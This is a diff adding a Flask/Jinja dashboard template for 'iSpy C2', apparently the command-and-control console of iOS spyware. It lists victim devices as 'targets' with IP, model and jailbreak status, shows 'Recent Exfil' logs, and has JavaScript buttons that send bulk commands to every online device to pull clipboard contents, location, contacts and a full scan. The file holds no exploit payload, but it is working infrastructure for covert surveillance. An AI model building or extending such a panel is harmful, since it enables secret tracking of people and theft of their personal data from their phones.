@@ -1,0 +1,344 @@
+{% extends 'admin/master.html' %}
+{% block title %}Dashboard — iSpy C2{% endblock %}
+
+{% block body %}
+<div style="padding:0;">
+
+  <!-- ══ STATS BAR ════════════════════════════════════════════════════ -->
+  <div style="display:grid;grid-template-columns:repeat(4,1fr);border-bottom:2px solid var(--border-hi);">
+    {% set cards = [
+      ('All Targets',     stats.total_devices,  '--green',  'Enrolled'),
+      ('Active Sessions', stats.online_devices, '--red',    'Online Now'),
+      ('Data Collected',  stats.total_logs,     '--cyan',   'Exfil Logs'),
+      ('Privileged',      stats.jailbroken,     '--yellow', 'Jailbroken'),
+    ] %}
+    {% for sub, val, cvar, label in cards %}
+    <div style="padding:16px 24px 14px;border-right:1px solid var(--border-hi);position:relative;
+                background:var(--bg-deep);
+                {% if loop.last %}border-right:none;{% endif %}">
+      <div style="position:absolute;bottom:0;left:0;right:0;height:3px;background:var({{ cvar }});opacity:0.5;"></div>
+      <div style="font-family:var(--ui);font-size:11px;font-weight:500;letter-spacing:1px;
+                  color:var(--text-3);margin-bottom:6px;">{{ sub }}</div>
+      <div style="font-family:var(--mono);font-size:42px;font-weight:700;line-height:1;
+                  color:var({{ cvar }});">
+        {{ '%02d' % val }}
+      </div>
+      <div style="font-family:var(--ui);font-size:12px;font-weight:700;letter-spacing:1px;
+                  color:var({{ cvar }});opacity:0.6;margin-top:5px;">
+        {{ label }}
+      </div>
+    </div>
+    {% endfor %}
+  </div>
+
+  <!-- ══ DEVICE TABLE ═════════════════════════════════════════════════ -->
+  <div style="padding:24px 28px 0;">
+    <!-- table header row -->
+    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">
+      <div style="display:flex;align-items:center;gap:16px;">
+        <span style="font-family:var(--ui);font-size:19px;font-weight:700;letter-spacing:2px;
+                     color:var(--green);text-transform:uppercase;">Target List</span>
+        <span style="width:1px;height:18px;background:var(--border-hi);display:inline-block;"></span>
+        <span style="font-family:var(--mono);font-size:17px;color:var(--text-3);"
+              id="tcount">{{ devices|length }} enrolled</span>
+      </div>
+      <div></div>
+    </div>
+
+    <!-- col headers -->
+    <div style="display:grid;grid-template-columns:150px 1fr 160px 190px 100px 70px 160px 180px;
+                gap:0;padding:14px 20px;background:var(--bg-raised);border:1px solid var(--border-hi);
+                border-bottom:none;">
+      {% for h in ['Status','Device UUID','IP Address','Model','iOS','JB','Last Contact',''] %}
+      <div style="font-family:var(--ui);font-size:15px;font-weight:700;letter-spacing:1px;
+                  color:var(--text-3);text-transform:uppercase;">{{ h }}</div>
+      {% endfor %}
+    </div>
+
+    <!-- rows -->
+    <div style="border:1px solid var(--border-hi);margin-bottom:28px;">
+      {% if devices %}
+        {% for device in devices %}
+        <div id="row-{{ device.device_name }}"
+             style="display:grid;grid-template-columns:150px 1fr 160px 190px 100px 70px 160px 180px;
+                    gap:0;padding:20px 20px;border-bottom:1px solid var(--border);
+                    align-items:center;transition:background 0.1s;
+                    {% if loop.last %}border-bottom:none;{% endif %}"
+             onmouseover="this.style.background='var(--bg-hover)'"
+             onmouseout="this.style.background='transparent'">
+
+          <!-- STATUS -->
+          <div style="display:flex;align-items:center;gap:10px;">
+            <span class="c2-dot offline" style="width:11px;height:11px;"></span>
+            <span class="dev-status-lbl"
+                  style="font-family:var(--ui);font-size:16px;font-weight:700;
+                         letter-spacing:0.5px;color:var(--text-3);">Offline</span>
+          </div>
+
+          <!-- UUID -->
+          <div style="font-family:var(--mono);font-size:15px;font-weight:700;color:var(--text-1);
+                      padding-right:14px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
+            {{ device.device_name }}
+          </div>
+
+          <!-- IP -->
+          <div style="font-family:var(--mono);font-size:16px;font-weight:700;color:var(--green);">
+            {{ device.ip_address or '—' }}
+          </div>
+
+          <!-- MODEL -->
+          <div style="font-family:var(--ui);font-size:16px;font-weight:500;color:var(--text-2);">
+            {{ device.model or '—' }}
+          </div>
+
+          <!-- iOS -->
+          <div>
+            <span style="font-family:var(--mono);font-size:15px;font-weight:700;color:var(--green);
+                         border:1px solid rgba(48,209,88,0.2);padding:5px 10px;border-radius:2px;">
+              {{ device.system_version or '?' }}
+            </span>
+          </div>
+
+          <!-- JB -->
+          <div>
+            {% if device.is_jailbroken %}
+            <span style="font-family:var(--ui);font-size:15px;font-weight:700;color:var(--yellow);
+                         border:1px solid rgba(255,215,64,0.3);padding:5px 10px;border-radius:2px;">
+              JB
+            </span>
+            {% else %}
+            <span style="color:var(--text-3);font-size:18px;">—</span>
+            {% endif %}
+          </div>
+
+          <!-- LAST CONTACT -->
+          <div style="font-family:var(--mono);font-size:15px;font-weight:600;color:var(--text-2);">
+            {{ device.last_seen.strftime('%m/%d %H:%M') if device.last_seen else 'Never' }}
+          </div>
+
+          <!-- CONTROL -->
+          <div>
+            <a href="{{ url_for('device.details_view', id=device.id) }}"
+               style="display:inline-flex;align-items:center;gap:8px;
+                      padding:12px 22px;border-radius:3px;text-decoration:none;
+                      font-family:var(--ui);font-size:15px;font-weight:700;letter-spacing:1px;
+                      text-transform:uppercase;transition:all 0.15s;
+                      background:rgba(212,130,42,0.07);border:1px solid var(--cyan-dim);
+                      color:var(--cyan);"
+               onmouseover="this.style.background='var(--cyan-dark)';this.style.boxShadow='var(--glow-cyan)'"
+               onmouseout="this.style.background='rgba(212,130,42,0.07)';this.style.boxShadow='none'">
+              ▶ &nbsp;Control
+            </a>
+          </div>
+
+        </div>
+        {% endfor %}
+      {% else %}
+        <div style="padding:60px;text-align:center;font-family:var(--mono);font-size:15px;
+                    color:var(--text-3);letter-spacing:3px;">
+          NO TARGETS ENROLLED
+        </div>
+      {% endif %}
+    </div>
+  </div>
+
+  <!-- ══ BULK COMMAND ════════════════════════════════════════════════ -->
+  <div style="padding:0 28px 24px;">
+    <div style="border:1px solid var(--border-hi);border-radius:4px;background:var(--bg-card);overflow:hidden;">
+      <div style="padding:13px 20px;background:var(--bg-raised);border-bottom:1px solid var(--border-hi);
+                  display:flex;align-items:center;gap:14px;">
+        <span style="font-family:'Ubuntu Sans',system-ui,sans-serif;font-size:15px;font-weight:700;
+                     letter-spacing:2px;color:var(--red);text-transform:uppercase;">⬡ Bulk Command</span>
+        <span style="font-family:var(--mono);font-size:13px;color:var(--text-3);">
+          — send to all online targets simultaneously
+        </span>
+      </div>
+      <div style="padding:16px 20px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+        {% set bulk_cmds = [
+          ('ping',        'Ping All',     'primary'),
+          ('identify',    'Re-Identify',  'primary'),
+          ('system_info', 'Sys Info',     'primary'),
+          ('clipboard',   'Clipboard',    'primary'),
+          ('location',    'Location',     'primary'),
+          ('contacts',    'Contacts',     'primary'),
+          ('full_scan',   'Full Scan',    'danger'),
+        ] %}
+        {% for cmd, label, cls in bulk_cmds %}
+        <button onclick="bulkCmd('{{ cmd }}')"
+                style="display:inline-flex;align-items:center;gap:7px;padding:10px 20px;border-radius:3px;
+                       font-family:'Ubuntu Sans',system-ui,sans-serif;font-size:14px;font-weight:700;
+                       letter-spacing:1px;text-transform:uppercase;cursor:pointer;border:1px solid;
+                       transition:all 0.12s;
+                       {% if cls == 'danger' %}
+                         background:rgba(255,64,96,0.08);border-color:var(--red-dim);color:var(--red);
+                       {% else %}
+                         background:rgba(212,130,42,0.07);border-color:var(--cyan-dim);color:var(--cyan);
+                       {% endif %}"
+                onmouseover="this.style.opacity='0.8'"
+                onmouseout="this.style.opacity='1'">
+          {{ label }}
+        </button>
+        {% endfor %}
+        <div id="bulk-status"
+             style="margin-left:auto;font-family:var(--mono);font-size:13px;color:var(--text-3);"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ BOTTOM STRIP: Feed + Recent Logs ════════════════════════════ -->
+  <div style="display:grid;grid-template-columns:1fr 1fr;border-top:1px solid var(--border-hi);
+              border-bottom:1px solid var(--border-hi);min-height:0;">
+
+    <!-- Live Feed -->
+    <div style="border-right:1px solid var(--border-hi);">
+      <div style="padding:14px 22px;border-bottom:1px solid var(--border-hi);background:var(--bg-raised);
+                  display:flex;align-items:center;gap:10px;">
+        <span class="c2-dot offline" id="feed-dot" style="width:10px;height:10px;"></span>
+        <span style="font-family:var(--ui);font-size:16px;font-weight:700;letter-spacing:3px;
+                     color:var(--text-2);text-transform:uppercase;">Live Event Feed</span>
+      </div>
+      <div id="feed" style="height:280px;overflow-y:auto;padding:6px 0;font-family:var(--mono);font-size:15px;">
+        <div style="padding:10px 20px;color:var(--text-3);">[....] Awaiting events…</div>
+      </div>
+    </div>
+
+    <!-- Recent Logs -->
+    <div>
+      <div style="padding:14px 22px;border-bottom:1px solid var(--border-hi);background:var(--bg-raised);
+                  display:flex;align-items:center;justify-content:space-between;">
+        <span style="font-family:var(--ui);font-size:16px;font-weight:700;letter-spacing:3px;
+                     color:var(--text-2);text-transform:uppercase;">Recent Exfil</span>
+        <a href="{{ url_for('log.index_view') }}"
+           style="font-family:var(--mono);font-size:14px;color:var(--green);letter-spacing:1px;font-weight:700;">
+          ALL LOGS →
+        </a>
+      </div>
+      <div style="height:280px;overflow-y:auto;">
+        {% if recent_logs %}
+          {% for log in recent_logs %}
+          <div style="display:grid;grid-template-columns:180px 1fr 110px;gap:12px;align-items:center;
+                      padding:14px 22px;border-bottom:1px solid var(--border);
+                      {% if loop.last %}border-bottom:none;{% endif %}">
+            <span style="font-family:var(--mono);font-size:14px;color:var(--green);
+                         border:1px solid rgba(48,209,88,0.2);padding:4px 10px;
+                         overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
+              {{ log.plugin_name | upper }}
+            </span>
+            <span style="font-family:var(--mono);font-size:15px;color:var(--text-2);
+                         overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
+              {{ (log.data or '')[:48] }}
+            </span>
+            <span style="font-family:var(--mono);font-size:14px;color:var(--text-3);text-align:right;">
+              {{ log.timestamp.strftime('%H:%M:%S') if log.timestamp else '' }}
+            </span>
+          </div>
+          {% endfor %}
+        {% else %}
+          <div style="padding:24px;text-align:center;font-family:var(--mono);font-size:15px;color:var(--text-3);">
+            NO DATA
+          </div>
+        {% endif %}
+      </div>
+    </div>
+
+  </div>
+
+</div>
+{% endblock %}
+
+{% block tail_js %}
+{{ super() }}
+<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
+<script>
+(function() {
+  var socket  = io.connect(location.protocol + '//' + document.domain + ':' + location.port);
+  var feedEl  = document.getElementById('feed');
+  var feedDot = document.getElementById('feed-dot');
+  var wsDot   = document.getElementById('nav-ws-dot');
+  var wsTxt   = document.getElementById('nav-ws-status');
+
+  function feedLine(msg, color) {
+    var ts = new Date().toISOString().slice(11,19);
+    var d  = document.createElement('div');
+    d.style.cssText = 'padding:6px 18px;color:' + (color||'var(--text-2)') +
+                      ';border-left:2px solid ' + (color||'var(--border-hi)') + ';margin:2px 0;';
+    d.textContent = '[' + ts + '] ' + msg;
+    feedEl.insertBefore(d, feedEl.firstChild);
+    if (feedEl.children.length > 60) feedEl.removeChild(feedEl.lastChild);
+  }
+
+  function setDeviceOnline(id, online) {
+    var row = document.getElementById('row-' + id);
+    if (!row) return;
+    var dot = row.querySelector('.c2-dot');
+    var lbl = row.querySelector('.dev-status-lbl');
+    if (dot) dot.className = 'c2-dot ' + (online ? 'online' : 'offline');
+    if (lbl) {
+      lbl.textContent = online ? 'Online' : 'Offline';
+      lbl.style.color = online ? 'var(--green)' : 'var(--text-3)';
+    }
+  }
+
+  socket.on('connect', function() {
+    socket.emit('join_admin');
+    if (wsDot) wsDot.className = 'c2-dot online';
+    if (wsTxt) { wsTxt.textContent = 'SOCKET ONLINE'; wsTxt.style.color = 'var(--green)'; }
+    if (feedDot) feedDot.className = 'c2-dot online';
+    feedLine('Admin session established', 'var(--green)');
+    syncStatus();
+  });
+
+  socket.on('disconnect', function() {
+    if (wsDot) wsDot.className = 'c2-dot offline';
+    if (wsTxt) { wsTxt.textContent = 'SOCKET OFFLINE'; wsTxt.style.color = 'var(--text-3)'; }
+    if (feedDot) feedDot.className = 'c2-dot offline';
+    feedLine('Socket lost', 'var(--red)');
+  });
+
+  socket.on('device_connected', function(d) {
+    feedLine('CONNECTED: ' + (d.device_id||'?'), 'var(--green)');
+    var row = document.getElementById('row-' + d.device_id);
+    if (!row) { setTimeout(function() { location.reload(); }, 800); }
+    else { setDeviceOnline(d.device_id, true); }
+  });
+  socket.on('device_disconnected', function(d) { feedLine('DISCONNECTED: ' + (d.device_id||'?'), 'var(--red)');  if(d.device_id) setDeviceOnline(d.device_id, false); });
+  socket.on('server_message',      function(d) { feedLine(d.message||'', 'var(--cyan)'); });
+
+  function syncStatus() {
+    document.querySelectorAll('[id^="row-"]').forEach(function(row) {
+      var dot = row.querySelector('.c2-dot');
+      var lbl = row.querySelector('.dev-status-lbl');
+      if (dot) dot.className = 'c2-dot offline';
+      if (lbl) { lbl.textContent = 'OFFLINE'; lbl.style.color = 'var(--text-3)'; }
+    });
+    fetch('/api/connected')
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        (data.devices||[]).forEach(function(d) {
+          if (d.authenticated) setDeviceOnline(d.device_id, true);
+        });
+      }).catch(function() {});
+  }
+
+  syncStatus();
+  setInterval(syncStatus, 20000);
+
+  /* ── Bulk command ── */
+  window.bulkCmd = function(cmd){
+    var status = document.getElementById('bulk-status');
+    if(status) status.textContent = 'Sending ' + cmd + '…';
+    fetch('/api/bulk-command', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({command: cmd, params: {}})
+    }).then(function(r){ return r.json(); })
+      .then(function(d){
+        if(status) status.textContent = '✓ Sent to ' + (d.sent_to||0) + ' device(s)';
+        setTimeout(function(){ if(status) status.textContent=''; }, 3000);
+      }).catch(function(){
+        if(status) status.textContent = '✗ Error';
+      });
+  };
+})();
+</script>
+{% endblock %}
